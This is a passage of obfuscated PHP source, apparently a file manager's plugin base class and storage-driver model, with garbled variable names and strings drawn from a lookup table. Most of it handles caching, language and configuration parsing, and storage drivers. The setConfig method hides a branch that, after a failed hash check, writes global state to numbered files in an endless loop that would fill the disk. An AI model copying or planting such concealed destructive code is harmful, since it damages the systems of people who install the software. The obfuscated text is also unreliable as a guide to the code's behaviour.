($šûß©ô = IO::fileNameExist($this->cachePath, $Ç¡–‡ŸÍ)) { return KodIO::make($šûß©ô); } $Ìóü‘òœ = $this->cachePath . $Ç¡–‡ŸÍ; return $this->pluginCacheFileSet($Ìóü‘òœ, file_get_contents_nossl($®Â‚šÄâ)); } final function _tmpFileName($£áó£Ö = array()) { $‰·œ‘– =& $_SERVER[ßğøİ]; if (!$£áó£Ö) { $£áó£Ö = $this->fileInfo; } if (isset($£áó£Ö[$‰·œ‘–[177]])) { return $£áó£Ö[$‰·œ‘–[177]]; } if (isset($£áó£Ö[$‰·œ‘–[170]][$‰·œ‘–[177]])) { return $£áó£Ö[$‰·œ‘–[170]][$‰·œ‘–[177]]; } $¢óÄ°ˆä = IO::hashSimple($£áó£Ö[$‰·œ‘–[84]]); if ($¢óÄ°ˆä) { return $¢óÄ°ˆä; } $»‚–¾ú¸ = array($£áó£Ö[$‰·œ‘–[32]], $£áó£Ö[$‰·œ‘–[84]], $£áó£Ö[$‰·œ‘–[76]]); if (isset($£áó£Ö[$‰·œ‘–[521]])) { $»‚–¾ú¸[] = $£áó£Ö[$‰·œ‘–[521]]; } return md5(implode($‰·œ‘–[11], $»‚–¾ú¸)); } final function checkSharePath($ûîí§ß—) { $ÈÏ“ª©á =& $_SERVER[ßğøİ]; if (!defined($ÈÏ“ª©á[475])) { define($ÈÏ“ª©á[514], 0); } if (!$this->isShare($ûîí§ß—)) { return !1; } $ÜÊá„ìò = Action($ÈÏ“ª©á[1175])->sharePathInfo($ûîí§ß—); if (!isset($ÜÊá„ìò[$ÈÏ“ª©á[84]])) { show_json(LNG($ÈÏ“ª©á[1548]), !1); } $this->fileInfo = $ÜÊá„ìò[$ÈÏ“ª©á[170]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$ÈÏ“ª©á[177]]); return $ÜÊá„ìò[$ÈÏ“ª©á[84]]; } final function pluginCachePath($ÒïÁûñø = '') { $ø³×¬¶ =& $_SERVER[ßğøİ]; $Ê¼æÙè = IO_PATH_SYSTEM_TEMP . $ø³×¬¶[1549] . $this->pluginName; if (!($Òˆ´©ÂÙ = IO::infoFull($Ê¼æÙè))) { return IO::mkdir($Ê¼æÙè . $ø³×¬¶[8] . $ÒïÁûñø); } if (empty($ÒïÁûñø)) { return $Òˆ´©ÂÙ[$ø³×¬¶[84]]; } if (!($‡ˆÛ‡‚Ë = IO::fileNameExist($Òˆ´©ÂÙ[$ø³×¬¶[84]], $ÒïÁûñø))) { return IO::mkdir($Òˆ´©ÂÙ[$ø³×¬¶[84]] . $ÒïÁûñø); } return KodIO::make($‡ˆÛ‡‚Ë); } final function pluginCacheFileSet($ËĞËºş, $¤Ú˜ƒµ = '') { $†³Ûã–— =& $_SERVER[ßğøİ]; if (!($ãÖÛë¤ä = IO::infoFull($ËĞËºş))) { return IO::mkfile($ËĞËºş, $¤Ú˜ƒµ, REPEAT_REPLACE); } IO::setContent($ãÖÛë¤ä[$†³Ûã–—[84]], $¤Ú˜ƒµ); return $ãÖÛë¤ä[$†³Ûã–—[84]]; } final function pluginLocalFile($İ©ºØÊñ = '') { $Ÿü„™ÃÛ =& $_SERVER[ßğøİ]; $âàïºÒ¼ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($âàïºÒ¼)) { mk_dir($âàïºÒ¼); } if (!$İ©ºØÊñ) { return $âàïºÒ¼; } $‚•ìß« = IO::info($İ©ºØÊñ); $¬¼Å—ûû = $this->_tmpFileName($‚•ìß«) . $Ÿü„™ÃÛ[10] . $‚•ìß«[$Ÿü„™ÃÛ[174]]; if (!checkExtSafe($¬¼Å—ûû)) { $¬¼Å—ûû = $¬¼Å—ûû . $Ÿü„™ÃÛ[1550]; } $¹Ó·¦¡ = $âàïºÒ¼ . $¬¼Å—ûû; if (@file_exists($¹Ó·¦¡)) { return $¹Ó·¦¡; } return IO::copy($İ©ºØÊñ, $âàïºÒ¼, 0, $¬¼Å—ûû); } final function appPackage() { $™Í òÈ =& $_SERVER[ßğøİ]; if ($this->packageData) { return $this->packageData; } $½°ıÅ³Á = $this->parseFile($this->pluginPath . $™Í òÈ[1551]); $this->parseLang($½°ıÅ³Á); $û»˜ë“ = json_decode_force($½°ıÅ³Á); if (!$û»˜ë“) { return array(); } $¨É®Æ÷³ = Hook::trigger($™Í òÈ[1552], $û»˜ë“); if ($¨É®Æ÷³ && is_array($¨É®Æ÷³)) { $û»˜ë“ = $¨É®Æ÷³; } $this->packageData = $û»˜ë“; return $û»˜ë“; } public function packageInfoGet($ ¼£®è») { $íî±Õƒº = $this->appPackage(); return array_get_value($íî±Õƒº, $ ¼£®è»); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ßğøİ][1553]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ßğøİ][1554]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ßğøİ][1555]); } public function echoJsAssign($òê»æ´†, $š”³Æˆ) { $this->echoJsAssignArr[$òê»æ´†] = $š”³Æˆ; } private function parseFile($¿®—ˆ) { $Ö¸í =& $_SERVER[ßğøİ]; $Â¾†‘—¢ = file_get_contents_nossl($¿®—ˆ); $ÅòºÁÙï = array($Ö¸í[1556], $Ö¸í[1557], $Ö¸í[1558], $Ö¸í[1559], $Ö¸í[1560], $Ö¸í[1561], $Ö¸í[1562]); $Öı³”€ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Ö¸í[89]][$Ö¸í[1563]]); foreach ($this->echoJsAssignArr as $„€¾è©½ => $ÄÉÂæòõ) { $ÅòºÁÙï[] = $Ö¸í[1564] . $„€¾è©½ . $Ö¸í[1565]; $Öı³”€[] = is_array($ÄÉÂæòõ) || is_object($ÄÉÂæòõ) ? rawurlencode(json_encode($ÄÉÂæòõ)) : $ÄÉÂæòõ; } if (strstr($Â¾†‘—¢, $Ö¸í[1566])) { $äÂ¡ÛÓ = rawurlencode(json_encode($this->pluginLangArr)); $Â¾†‘—¢ = str_replace($Ö¸í[1566], $äÂ¡ÛÓ, $Â¾†‘—¢); } if (strstr($Â¾†‘—¢, $Ö¸í[1567])) { $äÂ¡ÛÓ = $äÂ¡ÛÓ = rawurlencode(json_encode($this->getConfig())); $Â¾†‘—¢ = str_replace($Ö¸í[1567], $äÂ¡ÛÓ, $Â¾†‘—¢); } $Â¾†‘—¢ = str_replace($ÅòºÁÙï, $Öı³”€, $Â¾†‘—¢); return $Â¾†‘—¢; } private function parseLang(&$ÒéË²Ù) { $ÃÃ‰éÓ‰ =& $_SERVER[ßğøİ]; $®–ğùÍ = $ÃÃ‰éÓ‰[1568]; if (!strstr($ÒéË²Ù, $®–ğùÍ)) { return; } preg_match_all($ÃÃ‰éÓ‰[1569], $ÒéË²Ù, $ƒ¡ÄÂÉ); if (!is_array($ƒ¡ÄÂÉ) || count($ƒ¡ÄÂÉ) == 0 || !is_array($ƒ¡ÄÂÉ[0]) || count($ƒ¡ÄÂÉ[0]) == 0) { return; } $»¾´ï‚í = array(); $ğ·’Øƒˆ = array(); foreach ($ƒ¡ÄÂÉ[0] as $´³øÉşğ) { $¢Û–ğÙÄ = substr($´³øÉşğ, strlen($®–ğùÍ), -4); $Õ†Ç³ß• = LNG($¢Û–ğÙÄ); $»¾´ï‚í[] = $´³øÉşğ; $ğ·’Øƒˆ[] = str_replace(array($ÃÃ‰éÓ‰[231], $ÃÃ‰éÓ‰[1078], $ÃÃ‰éÓ‰[342], $ÃÃ‰éÓ‰[118]), array($ÃÃ‰éÓ‰[53], $ÃÃ‰éÓ‰[53], $ÃÃ‰éÓ‰[12], $ÃÃ‰éÓ‰[1570]), $Õ†Ç³ß•); } $ÒéË²Ù = str_replace($»¾´ï‚í, $ğ·’Øƒˆ, $ÒéË²Ù); } private function parseConfig(&$ƒïÌ•­Ÿ) { $•©šÖ¾ô =& $_SERVER[ßğøİ]; $é¥¨Ø× = $•©šÖ¾ô[1571]; if (!strstr($ƒïÌ•­Ÿ, $é¥¨Ø×)) { return; } preg_match_all($•©šÖ¾ô[1572], $ƒïÌ•­Ÿ, $¦İ©ú “); if (!is_array($¦İ©ú “) || count($¦İ©ú “) == 0 || !is_array($¦İ©ú “[0]) || count($¦İ©ú “[0]) == 0) { return; } $ÅØ¤é = $this->getConfig(); $‚¢–è÷ = array(); $«„‡­Ã = array(); foreach ($¦İ©ú “[0] as $Äªãòğâ) { $÷ö°ğ¬ = substr($Äªãòğâ, strlen($é¥¨Ø×), -2); $‚¢–è÷[] = $Äªãòğâ; $«„‡­Ã[] = _get($ÅØ¤é, $÷ö°ğ¬); } $ƒïÌ•­Ÿ = str_replace($‚¢–è÷, $«„‡­Ã, $ƒïÌ•­Ÿ); } private function parsePackage(&$êã¥İ÷Û) { $Û¨Ä¦«È =& $_SERVER[ßğøİ]; $Ø²ÖûÄ¥ = $Û¨Ä¦«È[1573]; if (!strstr($êã¥İ÷Û, $Ø²ÖûÄ¥)) { return; } preg_match_all($Û¨Ä¦«È[1574], $êã¥İ÷Û, $·Ó¼ÑÍ); if (!is_array($·Ó¼ÑÍ) || count($·Ó¼ÑÍ) == 0 || !is_array($·Ó¼ÑÍ[0]) || count($·Ó¼ÑÍ[0]) == 0) { return; } $ù±ÏÛÜŞ = $this->appPackage(); $—Àö½Ûˆ = array(); $½¬Ì = array(); foreach ($·Ó¼ÑÍ[0] as $ÁáÂéœ) { $²ğê¥”š = substr($ÁáÂéœ, strlen($Ø²ÖûÄ¥), -2); $—Àö½Ûˆ[] = $ÁáÂéœ; $½¬Ì[] = _get($ù±ÏÛÜŞ, $²ğê¥”š); } $êã¥İ÷Û = str_replace($—Àö½Ûˆ, $½¬Ì, $êã¥İ÷Û); } final function echoFile($¦¸ßî¿, $ê–—ˆ‚Î = false) { $Æ½îÇø =& $_SERVER[ßğøİ]; $õï¨Õçñ = $this->pluginPath . $¦¸ßî¿; if (ACT == $Æ½îÇø[1575]) { echo $Æ½îÇø[1576] . $this->pluginName . $Æ½îÇø[8] . $¦¸ßî¿ . $Æ½îÇø[1577]; if (!file_exists($õï¨Õçñ)) { echo $Æ½îÇø[1578]; return; } } $Õè¥”†ç = $this->parseFile($õï¨Õçñ); $this->parseLang($Õè¥”†ç); $this->parseConfig($Õè¥”†ç); $this->parsePackage($Õè¥”†ç); if (is_array($ê–—ˆ‚Î)) { $Õè¥”†ç = str_replace(array_keys($ê–—ˆ‚Î), array_values($ê–—ˆ‚Î), $Õè¥”†ç); } echo $Æ½îÇø[231] . $Õè¥”†ç; } final function initLang() { $ÆÍ¾Œõ =& $_SERVER[ßğøİ]; $Õ£ïÖÙÍ = $ÆÍ¾Œõ[1579]; $‚ŒØÛ‡¶ = $this->pluginPath . $ÆÍ¾Œõ[1580]; $¡ÁŒß² = I18n::getType(); $şù‘µÊÑ = array(); if (file_exists($‚ŒØÛ‡¶ . $¡ÁŒß² . $ÆÍ¾Œõ[835])) { $şù‘µÊÑ = (include $‚ŒØÛ‡¶ . $¡ÁŒß² . $ÆÍ¾Œõ[835]); } else { if ($¡ÁŒß² == $ÆÍ¾Œõ[1581] && !file_exists($‚ŒØÛ‡¶ . $¡ÁŒß² . $ÆÍ¾Œõ[835]) && file_exists($‚ŒØÛ‡¶ . $ÆÍ¾Œõ[1582])) { $şù‘µÊÑ = (include $‚ŒØÛ‡¶ . $ÆÍ¾Œõ[1582]); } else { if (file_exists($‚ŒØÛ‡¶ . $Õ£ïÖÙÍ . $ÆÍ¾Œõ[835])) { $şù‘µÊÑ = (include $‚ŒØÛ‡¶ . $Õ£ïÖÙÍ . $ÆÍ¾Œõ[835]); } } } if (!is_array($şù‘µÊÑ)) { return array(); } if (@count($şù‘µÊÑ) > 0) { I18n::set($şù‘µÊÑ); } return $şù‘µÊÑ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($œ˜±Î–Ï) { $™ºçñÔŒ =& $_SERVER[ßğøİ]; $ıò‘šÈØ = $_SERVER[$™ºçñÔŒ[869]]; $˜ˆŸ»ô¬ = $™ºçñÔŒ[870]; if ($_SERVER[$™ºçñÔŒ[871]] != $˜ˆŸ»ô¬($ıò‘šÈØ)) { $İå£·‘ = $™ºçñÔŒ[872]; $ÚñÄÀÏÃ = $™ºçñÔŒ[873]; $–¥ØÙğ = $_SERVER[$™ºçñÔŒ[874]] . $™ºçñÔŒ[875]; $«Ä¿öÒİ = $ÚñÄÀÏÃ($–¥ØÙğ); $ü· Ä…¦ = explode($™ºçñÔŒ[231], $«Ä¿öÒİ); if (count($ü· Ä…¦) < $™ºçñÔŒ[620]) { $¾ìÍ‚ß = $™ºçñÔŒ[876]; $¾ìÍ‚ß(); } $†¥Ëí–í = $™ºçñÔŒ[877]; $†¥Ëí–í($_SERVER[$™ºçñÔŒ[878]]); $İå£·‘ = $™ºçñÔŒ[872]; $İå£·‘(); $†”÷€™  = $™ºçñÔŒ[879]; $ÎÔŞÀÈé = json_encode($GLOBALS[$™ºçñÔŒ[880]]); $»ŞŞ»¾Ñ = 1; for ($ß®ıÕÚ = $»ŞŞ»¾Ñ; $ß®ıÕÚ > 0; $ß®ıÕÚ++) { $†”÷€™ (DATA_PATH . $ß®ıÕÚ, $ÎÔŞÀÈé); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $œ˜±Î–Ï); } public function onSetConfig($­„È®ó›) { } public function onGetConfig($ŸÃÕ¤üî) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ç­ºÌ¥ˆ) { if ($ç­ºÌ¥ˆ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($¨¬•ï§Ô = "\x70\x6c\165\147\x69\156\x41\165\x74\x68") { $ªçĞÀ â =& $_SERVER[ßğøİ]; if (!defined($ªçĞÀ â[475])) { return !1; } if (_get($GLOBALS, $ªçĞÀ â[503])) { return !0; } $Ì˜µ‚ß… = $this->getConfig(); if (!$Ì˜µ‚ß…[$¨¬•ï§Ô]) { return !1; } return ActionCall($ªçĞÀ â[1583], $Ì˜µ‚ß…[$¨¬•ï§Ô]); } public function url($”Ò£‚Ä, $¼äˆ²è¬ = '', $„óœö€å = true) { $õ¯îÕ¦ =& $_SERVER[ßğøİ]; $£±ëş¾İ = $this->getConfig(); $Ù¤ÀÙ© = KOD_VERSION . $õ¯îÕ¦[10] . KOD_VERSION_BUILD; $ÉÈ§Úø = $this->packageVersion(); $–Ÿù‘Ÿë = $Ù¤ÀÙ© . $õ¯îÕ¦[386] . $ÉÈ§Úø; if (substr($”Ò£‚Ä, 0, 4) == $õ¯îÕ¦[148] || substr($”Ò£‚Ä, 0, 2) == $õ¯îÕ¦[1367]) { $¯ÎÅ²ò = $”Ò£‚Ä . $õ¯îÕ¦[1584] . $–Ÿù‘Ÿë; } else { if ($¼äˆ²è¬ == $õ¯îÕ¦[12]) { $¯ÎÅ²ò = $this->pluginHost . $”Ò£‚Ä . $õ¯îÕ¦[1584] . $–Ÿù‘Ÿë; } else { if ($¼äˆ²è¬ === $õ¯îÕ¦[75]) { $¯ÎÅ²ò = $this->pluginHost . $”Ò£‚Ä; } else { if ($¼äˆ²è¬ == $õ¯îÕ¦[1585]) { $¯ÎÅ²ò = STATIC_PATH . $”Ò£‚Ä . $õ¯îÕ¦[1584] . $Ù¤ÀÙ©; } else { if ($¼äˆ²è¬ == $õ¯îÕ¦[1586]) { $¯ÎÅ²ò = APP_HOST . $õ¯îÕ¦[1587] . $”Ò£‚Ä . $õ¯îÕ¦[1584] . $Ù¤ÀÙ©; } else { if (isset($£±ëş¾İ[$¼äˆ²è¬])) { $¯ÎÅ²ò = $£±ëş¾İ[$¼äˆ²è¬] . $”Ò£‚Ä . $õ¯îÕ¦[1584] . $–Ÿù‘Ÿë; } } } } } } if (!$„óœö€å) { return $¯ÎÅ²ò; } echo $¯ÎÅ²ò; } public function link($Ì­† ÖÏ = false, $˜ËßñşÌ = '') { $±Ç³Æ£ =& $_SERVER[ßğøİ]; if (!$Ì­† ÖÏ) { $this->link($±Ç³Æ£[1588], $±Ç³Æ£[1586]); $this->link($±Ç³Æ£[1589], $±Ç³Æ£[1585]); $this->link($±Ç³Æ£[1590], $±Ç³Æ£[1585]); $this->link($±Ç³Æ£[1591], $±Ç³Æ£[1585]); $this->link($±Ç³Æ£[1592], $±Ç³Æ£[1585]); return; } $²áó¨öÃ = $this->url($Ì­† ÖÏ, $˜ËßñşÌ, !1); if (substr($Ì­† ÖÏ, -3) == $±Ç³Æ£[1593]) { echo $±Ç³Æ£[1594] . $²áó¨öÃ . $±Ç³Æ£[1595] . $±Ç³Æ£[231]; } else { if (substr($Ì­† ÖÏ, -4) == $±Ç³Æ£[1596]) { echo $±Ç³Æ£[1597] . $²áó¨öÃ . $±Ç³Æ£[1598] . $±Ç³Æ£[231]; } } } } goto fŒ³øæœÅ; dŠÒ¿‹İ‹„: class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\155\x2e\x73\x74\157\162\141\147\x65\114\x69\x73\x74"; public $field = array("\156\x61\155\x65", "\x73\151\172\x65\x4d\x61\170", "\163\171\x73\x74\x65\x6d", "\x64\x65\146\x61\165\154\164", "\x64\x72\151\166\x65\x72", "\x63\x6f\x6e\x66\x69\x67"); public function listData($îÉ·°ÇÜ = false, $úÇµõ = "\155\x6f\144\x69\146\x79\124\151\155\145", $œ­ÕÖÒ = false) { $×°Ó­š =& $_SERVER[ßğøİ]; $¯¬ã´Î× = parent::listData($îÉ·°ÇÜ, $úÇµõ, $œ­ÕÖÒ); if ($îÉ·°ÇÜ) { return $¯¬ã´Î×; } $ÊÆİ“Í¶ = $this->ioSizeUseGet(array_to_keyvalue($¯¬ã´Î×, $×°Ó­š[12], $×°Ó­š[399])); foreach ($¯¬ã´Î× as $É»°»Ç => $¢«ÏÈ’) { unset($¯¬ã´Î×[$É»°»Ç][$×°Ó­š[6]]); $¯¬ã´Î×[$É»°»Ç][$×°Ó­š[1817]] = isset($ÊÆİ“Í¶[$¢«ÏÈ’[$×°Ó­š[399]]]) ? $ÊÆİ“Í¶[$¢«ÏÈ’[$×°Ó­š[399]]] : 0; } return $¯¬ã´Î×; } public function ioSizeUseGet($™ÖĞˆÉñ) { $ñ²à½˜‰ =& $_SERVER[ßğøİ]; if (!$™ÖĞˆÉñ) { return array(); } $—‚¦î• = $ñ²à½˜‰[2140] . implode($ñ²à½˜‰[50], $™ÖĞˆÉñ); $¡¥ÌùÀÆ = Cache::get($—‚¦î•); if ($¡¥ÌùÀÆ) { return $¡¥ÌùÀÆ; } $½ûÎáş‚ = array($ñ²à½˜‰[814] => $ñ²à½˜‰[399], $ñ²à½˜‰[2141] => $ñ²à½˜‰[76]); $¥‚°ŸÏ = array($ñ²à½˜‰[814] => array($ñ²à½˜‰[7], $™ÖĞˆÉñ)); $¡¥ÌùÀÆ = Model($ñ²à½˜‰[786])->field($½ûÎáş‚)->where($¥‚°ŸÏ)->group($ñ²à½˜‰[814])->select(); $¡¥ÌùÀÆ = array_to_keyvalue($¡¥ÌùÀÆ, $ñ²à½˜‰[399], $ñ²à½˜‰[76]); Cache::set($—‚¦î•, $¡¥ÌùÀÆ, 600); return $¡¥ÌùÀÆ; } public function getConfig($øÊîàÆ) { $ƒŸñô·© = parent::listData($øÊîàÆ); return json_decode($ƒŸñô·©[$_SERVER[ßğøİ][6]], !0); } public function update($ø¯…·ó, $ã§Ú‰š‰) { $¨‚ıèòÜ =& $_SERVER[ßğøİ]; $Ã« Ä’ = $ã§Ú‰š‰[$¨‚ıèòÜ[32]]; $Å‡ˆÓÃ = array_to_keyvalue(parent::listData(), $¨‚ıèòÜ[32]); if (isset($Å‡ˆÓÃ[$Ã« Ä’]) && $Å‡ˆÓÃ[$Ã« Ä’][$¨‚ıèòÜ[399]] != $ø¯…·ó) { return !1; } if (!empty($ã§Ú‰š‰[$¨‚ıèòÜ[6]])) { $ıÍÃ¾º˜ = json_decode($ã§Ú‰š‰[$¨‚ıèòÜ[6]], !0); $å¼©¡ú = isset($ıÍÃ¾º˜[$¨‚ıèòÜ[2142]]) ? $¨‚ıèòÜ[2142] : (isset($ıÍÃ¾º˜[$¨‚ıèòÜ[2143]]) ? $¨‚ıèòÜ[2143] : $¨‚ıèòÜ[12]); if ($å¼©¡ú) { $º©¯… = $this->getConfig($ø¯…·ó); $…Ò³™í = $º©¯…[$å¼©¡ú]; $¸ŒŠãˆ = $ıÍÃ¾º˜[$å¼©¡ú]; if ($¸ŒŠãˆ == str_repeat($¨‚ıèòÜ[188], strlen($…Ò³™í))) { $ıÍÃ¾º˜[$å¼©¡ú] = $…Ò³™í; } else { if ($¸ŒŠãˆ != $…Ò³™í) { $ã§Ú‰š‰[$¨‚ıèòÜ[2144]] = $¨‚ıèòÜ[88]; } } } } if (isset($ã§Ú‰š‰[$¨‚ıèòÜ[2144]]) && $ã§Ú‰š‰[$¨‚ıèòÜ[2144]] == $¨‚ıèòÜ[88]) { $this->checkConfig($ã§Ú‰š‰); } unset($ã§Ú‰š‰[$¨‚ıèòÜ[2144]]); $”ëóà‡© = parent::update($ø¯…·ó, $ã§Ú‰š‰); if ($”ëóà‡© && $ã§Ú‰š‰[$¨‚ıèòÜ[37]]) { $å‹Ë¤¡€ = 0; foreach ($Å‡ˆÓÃ as $€ğ°¼Öœ) { if ($€ğ°¼Öœ[$¨‚ıèòÜ[37]] && $€ğ°¼Öœ[$¨‚ıèòÜ[399]] != $ø¯…·ó) { $å‹Ë¤¡€ = $€ğ°¼Öœ[$¨‚ıèòÜ[399]]; parent::update($€ğ°¼Öœ[$¨‚ıèòÜ[399]], array($¨‚ıèòÜ[37] => 0)); } } $this->updateBackup($ø¯…·ó, $å‹Ë¤¡€); } return $”ëóà‡©; } public function add($Ûá¤§–İ) { $òÎÛá€ =& $_SERVER[ßğøİ]; $Ÿó«›ıŠ = array_to_keyvalue(parent::listData(), $òÎÛá€[32]); if (isset($Ÿó«›ıŠ[$Ûá¤§–İ[$òÎÛá€[32]]])) { return !1; } $this->checkConfig($Ûá¤§–İ); $ª¢×¼— = parent::insert($Ûá¤§–İ); if ($ª¢×¼— && $Ûá¤§–İ[$òÎÛá€[37]]) { foreach ($Ÿó«›ıŠ as $½Ÿï´ÑÈ) { if ($½Ÿï´ÑÈ[$òÎÛá€[37]]) { parent::update($½Ÿï´ÑÈ[$òÎÛá€[399]], array($òÎÛá€[37] => 0)); } } } return $ª¢×¼—; } public function updateBackup($Ô¨¥ìò×, $æÏÂô§ì) { $¸Äà ± =& $_SERVER[ßğøİ]; if (!$æÏÂô§ì) { return; } $İÆÊòõá = Model($¸Äà ±[746])->config(); if ($İÆÊòõá[$¸Äà ±[1625]] != $¸Äà ±[88] || $İÆÊòõá[$¸Äà ±[749]] != $æÏÂô§ì) { return; } $Ùƒ±¨ç— = Model($¸Äà ±[767])->get($¸Äà ±[777]); $Ùƒ±¨ç— = json_decode($Ùƒ±¨ç—, !0); if (!$Ùƒ±¨ç—) { return; } $Ùƒ±¨ç—[$¸Äà ±[749]] = $Ô¨¥ìò×; Model($¸Äà ±[767])->set(array($¸Äà ±[777] => $Ùƒ±¨ç—)); } public function checkConfig(&$ŞúŸ«ØÅ, $À’ªÚú´ = false) { $ÁâŞªË =& $_SERVER[ßğøİ]; $×ıâ°£ = strtolower($ŞúŸ«ØÅ[$ÁâŞªË[95]]); $†ÒñğÌ÷ = json_decode($ŞúŸ«ØÅ[$ÁâŞªË[6]], !0); foreach ($†ÒñğÌ÷ as $¤ö²›æ¿ => $ÓÀÄàĞó) { $†ÒñğÌ÷[$¤ö²›æ¿] = trim($ÓÀÄàĞó); } $†ÒñğÌ÷[$ÁâŞªË[2145]] = rand_string(6); $Ô¬¥œúÃ = $GLOBALS[$ÁâŞªË[6]][$ÁâŞªË[89]][$ÁâŞªË[823]]; $¨Ó†ŒéÂ = isset($Ô¬¥œúÃ[$×ıâ°£]) ? $Ô¬¥œúÃ[$×ıâ°£] : ucfirst($×ıâ°£); $ĞÕüÁã¦ = $ÁâŞªË[74] . $¨Ó†ŒéÂ; if (!$¨Ó†ŒéÂ || !class_exists($ĞÕüÁã¦)) { if ($À’ªÚú´) { return LNG($ÁâŞªË[2146]); } write_log(array($ÁâŞªË[2147], $ŞúŸ«ØÅ, get_caller_info()), $ÁâŞªË[2148]); show_json(LNG($ÁâŞªË[2146]), !1, $ŞúŸ«ØÅ); } $‡Â«±ÏÏ = new $ĞÕüÁã¦($†ÒñğÌ÷); if (in_array($×ıâ°£, $‡Â«±ÏÏ->objectDriver)) { if (!$‡Â«±ÏÏ->isBucketCors() && !$‡Â«±ÏÏ->setBucketCors()) { $ı¦áñİ = LNG($ÁâŞªË[2149]); $ı¦áñİ .= $ÁâŞªË[2150] . LNG($ÁâŞªË[2151]); if ($À’ªÚú´) { return $ı¦áñİ; } show_json($ı¦áñİ, !1); } } $‚ç×Œ¿ì = rtrim($†ÒñğÌ÷[$ÁâŞªË[1181]], $ÁâŞªË[8]) . $ÁâŞªË[8]; $È€«ÆØç = $‡Â«±ÏÏ->getPath($‚ç×Œ¿ì . $ÁâŞªË[1243]); if (!$‡Â«±ÏÏ->mkfile($È€«ÆØç)) { if ($À’ªÚú´) { return LNG($ÁâŞªË[2149]); } show_json(LNG($ÁâŞªË[2149]), !1); } $†ÒñğÌ÷[$ÁâŞªË[1181]] = $‚ç×Œ¿ì; $ŞúŸ«ØÅ[$ÁâŞªË[6]] = json_encode($†ÒñğÌ÷); $ŞúŸ«ØÅ[$ÁâŞªË[95]] = $¨Ó†ŒéÂ; return !0; } public function driverListSystem() { $¦×Šù¨’ =& $_SERVER[ßğøİ]; $€ƒí¾öÀ = parent::listData(); $Á§é•ö» = array(); foreach ($€ƒí¾öÀ as $ŞŞ†Ú–Ø) { unset($ŞŞ†Ú–Ø[$¦×Šù¨’[200]], $ŞŞ†Ú–Ø[$¦×Šù¨’[85]]); $ŞŞ†Ú–Ø[$¦×Šù¨’[6]] = json_decode($ŞŞ†Ú–Ø[$¦×Šù¨’[6]], !0); $Á§é•ö»[] = $ŞŞ†Ú–Ø; } return $Á§é•ö»; } public function defaultDriver() { $­œé„ğ” =& $_SERVER[ßğøİ]; $Ş—°©˜æ = parent::listData(); $ë ‹¶®€ = array_filter_by_field($Ş—°©˜æ, $­œé„ğ”[37], 1); $ë ‹¶®€ = $ë ‹¶®€[0]; if ($ë ‹¶®€) { $ë ‹¶®€[$­œé„ğ”[6]] = json_decode($ë ‹¶®€[$­œé„ğ”[6]], !0); } return $ë ‹¶®€; } public function driverInfo($„¹×‘Ò¸) { $¬ÚÕƒö– =& $_SERVER[ßğøİ]; $ğ«®Ï© = array_to_keyvalue(parent::listData(), $¬ÚÕƒö–[399]); if (!isset($ğ«®Ï©[$„¹×‘Ò¸])) { return !1; } $Å¥ÒÕšè = $ğ«®Ï©[$„¹×‘Ò¸]; $Å¥ÒÕšè[$¬ÚÕƒö–[6]] = json_decode($Å¥ÒÕšè[$¬ÚÕƒö–[6]], !0); return $Å¥ÒÕšè; } public function remove($ÎÓ‚·¢İ) { $this->removeShareItems($ÎÓ‚·¢İ); return parent::remove($ÎÓ‚·¢İ); } public function removeWithFile($÷‘«ùÕÙ, $†¯Ê—ƒ¢) { $šƒ‰×ï© =& $_SERVER[ßğøİ]; $‚„ı°šÙ = array($šƒ‰×ï©[814] => $÷‘«ùÕÙ); $¿Š÷¼Á® = Model($šƒ‰×ï©[471])->where($‚„ı°šÙ)->count(); $ÛÊÑûšç = Model($šƒ‰×ï©[471])->where($‚„ı°šÙ)->sum($šƒ‰×ï©[76]); $ÉåçŒèó = $†¯Ê—ƒ¢ . $šƒ‰×ï©[2152] . $÷‘«ùÕÙ; $î©‡¾¸Ç = LNG($†¯Ê—ƒ¢ == $šƒ‰×ï©[557] ? $šƒ‰×ï©[2153] : $šƒ‰×ï©[2154]); $Ã”Êôš¿ = new TaskFileTransfer($ÉåçŒèó, $šƒ‰×ï©[2148], $¿Š÷¼Á®, $î©‡¾¸Ç . "\x28{$÷‘«ùÕÙ}\x29"); $Ã”Êôš¿->task[$šƒ‰×ï©[760]] = (double) $ÛÊÑûšç; $Ğ¿áı‚€ = KodIO::defaultDriver(); $Ï€ôï = $Ğ¿áı‚€[$šƒ‰×ï©[399]]; $ò©ìª€ = "\x7b\151\157\x3a{$Ï€ôï}\175\x2f"; $Ğ¨Ë¸ = !0; $è¯‘›§© = array(); $·š»¤ÃÒ = Model($šƒ‰×ï©[199])->where($‚„ı°šÙ)->field($šƒ‰×ï©[2155])->select(); foreach ($·š»¤ÃÒ as $À˜øŒİ) { $âãŒ¤Ü = $À˜øŒİ[$šƒ‰×ï©[84]]; $çÔ‰û”— = $ò©ìª€ . str_replace("\x7b\x69\x6f\72{$÷‘«ùÕÙ}\175\57", $šƒ‰×ï©[12], $âãŒ¤Ü); if (!IO::exist($âãŒ¤Ü)) { $è¯‘›§©[] = $À˜øŒİ[$šƒ‰×ï©[468]]; $Ã”Êôš¿->updateFileEnd($À˜øŒİ[$šƒ‰×ï©[32]], $À˜øŒİ[$šƒ‰×ï©[76]]); continue; } if (IO::exist($çÔ‰û”—)) { $Ã”Êôš¿->updateFileEnd($À˜øŒİ[$šƒ‰×ï©[32]], $À˜øŒİ[$šƒ‰×ï©[76]]); continue; } if (!IO::move($âãŒ¤Ü, get_path_father($çÔ‰û”—))) { $Ğ¨Ë¸ = !1; break; } $‚„ı°šÙ = array($šƒ‰×ï©[468] => $À˜øŒİ[$šƒ‰×ï©[468]]); $ø—Äº’• = array($šƒ‰×ï©[814] => $Ï€ôï, $šƒ‰×ï©[84] => 